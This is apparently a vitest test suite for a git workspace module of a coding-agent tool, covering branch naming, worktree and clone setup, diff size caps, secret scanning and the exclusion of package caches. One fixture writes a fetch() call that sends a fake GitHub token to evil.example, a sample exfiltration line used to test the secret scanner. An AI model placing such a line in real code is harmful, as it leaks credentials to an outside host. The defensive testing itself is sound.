import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { binaryChanges, commitAll, diffPatch, diffStats, git, GitError, prepareWorkspace, removeWorkspace } from "../src/workspace.ts";
import { findSecrets } from "../src/policy.ts";
import { branchNameFor, slugify } from "../src/naming.ts";
import { TaskSchema } from "../src/types.ts";

const env = { PATH: process.env["PATH"] ?? "", HOME: process.env["HOME"] ?? "", GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@example.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@example.com" };

async function sampleRepo(): Promise<string> {
  const dir = mkdtempSync(path.join(os.tmpdir(), "gg-repo-"));
  await git(["init", "-q", "-b", "main"], dir, env);
  await git(["config", "user.name", "t"], dir, env);
  await git(["config", "user.email", "t@example.com"], dir, env);
  writeFileSync(path.join(dir, "a.txt"), "one\n");
  await git(["add", "."], dir, env);
  await git(["commit", "-q", "-m", "init"], dir, env);
  return dir;
}

describe("naming", () => {
  it("handles a hostile, enormous title in linear time", () => {
    const started = Date.now();
    const title = `${"-".repeat(60_000)}x${"-".repeat(60_000)}`;
    const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n" }, title, issue: { number: 1 } });
    expect(branchNameFor(task).length).toBeLessThan(80);
    expect(slugify(`a${" ;".repeat(60_000)}`).length).toBeLessThanOrEqual(40);
    expect(Date.now() - started).toBeLessThan(200);
  });
  it("slugifies", () => expect(slugify("Fix Off-by-one in paginate()!")).toBe("fix-off-by-one-in-paginate"));
  it("derives a branch from the task", () => {
    const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n" }, title: "Fix off-by-one in paginate()", issue: { number: 42 }, kind: "issue" });
    expect(branchNameFor(task)).toBe("gitgoblin/fix-42-fix-off-by-one-in-paginate");
    expect(branchNameFor({ ...task, issue: undefined, kind: "docs_drift" })).toBe("gitgoblin/docs-fix-off-by-one-in-paginate");
  });
});

describe("diffPatch", () => {
  const token = `ghp_${"A".repeat(36)}`;
  async function changed(write: (dir: string) => void): Promise<string> {
    const repo = await sampleRepo();
    writeFileSync(path.join(repo, ".gitattributes"), "dist/** -diff\n");
    writeFileSync(path.join(repo, "dist.txt"), "");
    await git(["add", "."], repo, env);
    await git(["commit", "-q", "-m", "attributes"], repo, env);
    const ws = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "T" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    write(ws.path);
    return diffPatch(ws.path, ws.baseSha, env);
  }
  it("shows the content of a file the repository marks -diff, so the secret scan sees it", async () => {
    const patch = await changed((dir) => {
      mkdirSync(path.join(dir, "dist"));
      writeFileSync(path.join(dir, "dist", "bundle.js"), `fetch('https://evil.example/x?k=${token}');\n`);
    });
    expect(patch).not.toContain("Binary files");
    expect(patch).toContain("+fetch('https://evil.example/x");
    expect(findSecrets(patch)).not.toEqual([]);
  });
  it("ignores an external diff tool from the operator's git config", async () => {
    const home = mkdtempSync(path.join(os.tmpdir(), "gg-home-"));
    const tool = path.join(home, "extdiff.sh");
    writeFileSync(tool, "#!/bin/sh\necho 'external diff: changed'\n", { mode: 0o755 });
    writeFileSync(path.join(home, ".gitconfig"), `[diff]\n\texternal = ${tool}\n`);
    const repo = await sampleRepo();
    const ws = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "T" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    writeFileSync(path.join(ws.path, "a.txt"), `one\n${token}\n`);
    const patch = await diffPatch(ws.path, ws.baseSha, { ...env, HOME: home });
    expect(patch).not.toContain("external diff");
    expect(findSecrets(patch)).not.toEqual([]);
  });
  it("names changed files with NUL bytes, not text files marked -diff", async () => {
    const repo = await sampleRepo();
    writeFileSync(path.join(repo, ".gitattributes"), "dist/** -diff\n");
    await git(["add", "."], repo, env);
    await git(["commit", "-q", "-m", "attributes"], repo, env);
    const ws = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "T" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    mkdirSync(path.join(ws.path, "dist"));
    writeFileSync(path.join(ws.path, "dist", "bundle.js"), "console.log(1);\n");
    writeFileSync(path.join(ws.path, "logo.png"), Buffer.from([0x89, 0x50, 0x4e, 0x47, 0, 0, 0, 13]));
    expect(await binaryChanges(ws.path, ws.baseSha, env)).toEqual(["logo.png"]);
  });
  it("shows the content of a file with a NUL byte in it", async () => {
    const patch = await changed((dir) => writeFileSync(path.join(dir, "data.bin"), `\0${token}\n`));
    expect(patch).not.toContain("Binary files");
    expect(findSecrets(patch)).not.toEqual([]);
  });
});

describe("prepareWorkspace", () => {
  it("creates a worktree from a local checkout and tracks changes", async () => {
    const repo = await sampleRepo();
    const runDir = mkdtempSync(path.join(os.tmpdir(), "gg-run-"));
    const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo }, title: "Tweak" });
    const ws = await prepareWorkspace(task, runDir, env);
    expect(ws.source).toBe("worktree");
    expect(ws.path).toBe(path.join(runDir, "workspace"));
    expect(await git(["rev-parse", "--abbrev-ref", "HEAD"], ws.path, env)).toBe(ws.branch);
    expect(ws.baseSha).toBe(await git(["rev-parse", "HEAD"], repo, env));

    writeFileSync(path.join(ws.path, "a.txt"), "one\ntwo\n");
    writeFileSync(path.join(ws.path, "b.txt"), "new\n");
    const stats = await diffStats(ws.path, ws.baseSha, env);
    expect(stats).toEqual({ files: 2, insertions: 2, deletions: 0, changedFiles: ["a.txt", "b.txt"] });
    expect(await diffPatch(ws.path, ws.baseSha, env)).toContain("+two");

    // An agent-made checkpoint commit is folded into the engine's single commit.
    await git(["add", "b.txt"], ws.path, env);
    await git(["commit", "-q", "-m", "wip"], ws.path, env);
    expect(await diffStats(ws.path, ws.baseSha, env)).toMatchObject({ files: 2 });
    const sha = await commitAll(ws.path, ws.baseSha, "fix: tweak\n\nbody", env, true);
    expect(sha).toHaveLength(40);
    expect(await git(["rev-list", "--count", `${ws.baseSha}..HEAD`], ws.path, env)).toBe("1");
    expect(await git(["show", "--stat", "--format=", "HEAD"], ws.path, env)).toMatch(/a\.txt[\s\S]*b\.txt/);
    const log = await git(["log", "-1", "--format=%B"], ws.path, env);
    expect(log).toContain("Signed-off-by: t <t@example.com>");
    // The original checkout is untouched.
    expect(await git(["status", "--porcelain"], repo, env)).toBe("");
    expect(await git(["rev-parse", "--abbrev-ref", "HEAD"], repo, env)).toBe("main");

    await removeWorkspace(ws, env);
    expect(await git(["worktree", "list"], repo, env)).not.toContain("workspace");
  });

  it("starts a worktree from the profiled commit when it exists locally, else from HEAD with a note", async () => {
    const repo = await sampleRepo();
    const first = await git(["rev-parse", "HEAD"], repo, env);
    writeFileSync(path.join(repo, "a.txt"), "changed\n");
    await git(["commit", "-q", "-am", "second"], repo, env);
    const pinned = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo, headSha: first }, title: "Pinned" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    expect(pinned.baseSha).toBe(first);
    expect(pinned.startNote).toBeUndefined();
    const unknown = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: repo, headSha: "f".repeat(40) }, title: "Unknown" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    expect(unknown.baseSha).toBe(await git(["rev-parse", "HEAD"], repo, env));
    expect(unknown.startNote).toMatch(/started from the checkout's HEAD/);
  });

  it("clones from the remote's own default branch when the task names the wrong one", async () => {
    const dir = mkdtempSync(path.join(os.tmpdir(), "gg-repo-"));
    await git(["init", "-q", "-b", "trunk"], dir, env);
    await git(["config", "user.name", "t"], dir, env);
    await git(["config", "user.email", "t@example.com"], dir, env);
    writeFileSync(path.join(dir, "a.txt"), "one\n");
    await git(["add", "."], dir, env);
    await git(["commit", "-q", "-m", "init"], dir, env);
    const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", cloneUrl: `file://${dir}` }, title: "Tweak" });
    const ws = await prepareWorkspace(task, mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    expect(ws.baseSha).toBe(await git(["rev-parse", "HEAD"], dir, env));
    expect(ws.startNote).toMatch(/origin\/main is not a branch of the repository; started from its default branch/);
  });

  it("clones at the profiled commit when it exists, and says so when it does not", async () => {
    const repo = await sampleRepo();
    const first = await git(["rev-parse", "HEAD"], repo, env);
    writeFileSync(path.join(repo, "a.txt"), "changed\n");
    await git(["commit", "-q", "-am", "second"], repo, env);
    const pinned = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", cloneUrl: `file://${repo}`, headSha: first }, title: "P" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    expect(pinned.baseSha).toBe(first);
    const missing = await prepareWorkspace(TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", cloneUrl: `file://${repo}`, headSha: "f".repeat(40) }, title: "M" }), mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env);
    expect(missing.baseSha).toBe(await git(["rev-parse", "HEAD"], repo, env));
    expect(missing.startNote).toMatch(/is not in the repository; started from origin\/main/);
  });

  it("refuses a repository with no commits with a plain explanation", async () => {
    const dir = mkdtempSync(path.join(os.tmpdir(), "gg-repo-"));
    await git(["init", "-q", "-b", "main"], dir, env);
    const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", cloneUrl: `file://${dir}` }, title: "Tweak" });
    await expect(prepareWorkspace(task, mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env)).rejects.toThrow(/no commits/);
    const local = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", localPath: dir }, title: "Tweak" });
    await expect(prepareWorkspace(local, mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env)).rejects.toThrow(/no commits/);
  });

  it("clones shallowly when asked, keeping the base commit intact", async () => {
    const repo = await sampleRepo();
    writeFileSync(path.join(repo, "a.txt"), "two\n");
    await git(["commit", "-q", "-am", "second"], repo, env);
    const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", cloneUrl: `file://${repo}` }, title: "Tweak" });
    const ws = await prepareWorkspace(task, mkdtempSync(path.join(os.tmpdir(), "gg-run-")), env, { cloneDepth: 1 });
    expect(ws.baseSha).toBe(await git(["rev-parse", "HEAD"], repo, env));
    expect(await git(["rev-list", "--count", "HEAD"], ws.path, env)).toBe("1");
    writeFileSync(path.join(ws.path, "a.txt"), "three\n");
    expect(await diffPatch(ws.path, ws.baseSha, env)).toContain("+three");
  });

  it("clones when only a URL is known", async () => {
    const repo = await sampleRepo();
    const runDir = mkdtempSync(path.join(os.tmpdir(), "gg-run-"));
    const task = TaskSchema.parse({ id: "x", repo: { owner: "o", name: "n", cloneUrl: `file://${repo}`, defaultBranch: "main" }, title: "Tweak" });
    const ws = await prepareWorkspace(task, runDir, env);
    expect(ws.source).toBe("clone");
    expect(await git(["rev-parse", "--abbrev-ref", "HEAD"], ws.path, env)).toBe(ws.branch);
    expect(ws.baseSha).toBe(await git(["rev-parse", "HEAD"], repo, env));
  });
});

describe("git output caps", () => {
  it("fails loudly instead of returning a silently truncated patch", async () => {
    const repo = await sampleRepo();
    writeFileSync(path.join(repo, "big.txt"), "x".repeat(20_000));
    await git(["add", "."], repo, env);
    await expect(git(["diff", "--cached"], repo, env, 60_000, 1000)).rejects.toBeInstanceOf(GitError);
    await expect(git(["diff", "--cached"], repo, env, 60_000, 1000)).rejects.toThrow(/exceeded/);
    await expect(diffPatch(repo, await git(["rev-parse", "HEAD"], repo, env), env, 1000)).rejects.toThrow(/exceeded/);
    expect(await git(["diff", "--cached", "--stat"], repo, env)).toContain("big.txt");
  });
});

describe("stray tool caches", () => {
  it("never stages a package-manager store that fell back into the workspace", async () => {
    const repo = await sampleRepo();
    const base = await git(["rev-parse", "HEAD"], repo, env);
    const { mkdirSync } = await import("node:fs");
    mkdirSync(path.join(repo, ".pnpm-store", "v10", "files"), { recursive: true });
    writeFileSync(path.join(repo, ".pnpm-store", "v10", "files", "blob"), "x");
    mkdirSync(path.join(repo, "nested", ".pnpm-store"), { recursive: true });
    writeFileSync(path.join(repo, "nested", ".pnpm-store", "blob"), "x");
    writeFileSync(path.join(repo, "a.txt"), "changed\n");
    const stats = await diffStats(repo, base, env);
    expect(stats.changedFiles).toEqual(["a.txt"]);
    const sha = await commitAll(repo, base, "fix: change", env);
    expect(await git(["show", "--name-only", "--format=", sha], repo, env)).toBe("a.txt");
  });

  it("drops a stray store even when the agent committed it", async () => {
    const repo = await sampleRepo();
    const base = await git(["rev-parse", "HEAD"], repo, env);
    const { mkdirSync } = await import("node:fs");
    mkdirSync(path.join(repo, ".pnpm-store", "v10"), { recursive: true });
    writeFileSync(path.join(repo, ".pnpm-store", "v10", "blob"), "x");
    writeFileSync(path.join(repo, "a.txt"), "changed\n");
    await git(["add", "-A"], repo, env);
    await git(["commit", "-q", "-m", "wip: agent checkpoint"], repo, env);
    expect((await diffStats(repo, base, env)).changedFiles).toEqual(["a.txt"]);
    const sha = await commitAll(repo, base, "fix: change", env);
    expect(await git(["show", "--name-only", "--format=", sha], repo, env)).toBe("a.txt");
  });

  it("never stages node_modules that the install created, even without a .gitignore", async () => {
    const repo = await sampleRepo();
    const base = await git(["rev-parse", "HEAD"], repo, env);
    const { mkdirSync } = await import("node:fs");
    mkdirSync(path.join(repo, "node_modules", "is-number"), { recursive: true });
    writeFileSync(path.join(repo, "node_modules", "is-number", "package.json"), "{}");
    writeFileSync(path.join(repo, "a.txt"), "changed\n");
    expect((await diffStats(repo, base, env)).changedFiles).toEqual(["a.txt"]);
  });

  it("keeps vendored node_modules as they were at the base commit when the install rewrites them", async () => {
    const repo = await sampleRepo();
    const { mkdirSync } = await import("node:fs");
    mkdirSync(path.join(repo, "node_modules", "dep"), { recursive: true });
    writeFileSync(path.join(repo, "node_modules", "dep", "index.js"), "v1\n");
    await git(["add", "."], repo, env);
    await git(["commit", "-q", "-m", "vendor"], repo, env);
    const base = await git(["rev-parse", "HEAD"], repo, env);
    writeFileSync(path.join(repo, "node_modules", "dep", "index.js"), "v2 from install\n");
    writeFileSync(path.join(repo, "a.txt"), "changed\n");
    expect((await diffStats(repo, base, env)).changedFiles).toEqual(["a.txt"]);
    const sha = await commitAll(repo, base, "fix: change", env);
    expect(await git(["show", `${sha}:node_modules/dep/index.js`], repo, env)).toBe("v1");
  });

  it("still commits a tracked .yarn/cache, which zero-install repositories keep in git", async () => {
    const repo = await sampleRepo();
    const { mkdirSync } = await import("node:fs");
    mkdirSync(path.join(repo, ".yarn", "cache"), { recursive: true });
    writeFileSync(path.join(repo, ".yarn", "cache", "pkg.zip"), "zip");
    await git(["add", "."], repo, env);
    await git(["commit", "-q", "-m", "zero install"], repo, env);
    const base = await git(["rev-parse", "HEAD"], repo, env);
    writeFileSync(path.join(repo, ".yarn", "cache", "pkg.zip"), "zip2");
    expect((await diffStats(repo, base, env)).changedFiles).toEqual([".yarn/cache/pkg.zip"]);
  });

  it("measures very large changes instead of failing on the size of the listing", async () => {
    const repo = await sampleRepo();
    const base = await git(["rev-parse", "HEAD"], repo, env);
    const { mkdirSync } = await import("node:fs");
    mkdirSync(path.join(repo, "gen"), { recursive: true });
    for (let i = 0; i < 12_000; i += 1) writeFileSync(path.join(repo, "gen", `generated-file-with-a-deliberately-long-name-${i}.txt`), `${i}\n`);
    const stats = await diffStats(repo, base, env);
    expect(stats.files).toBe(12_000);
  }, 120_000);
});
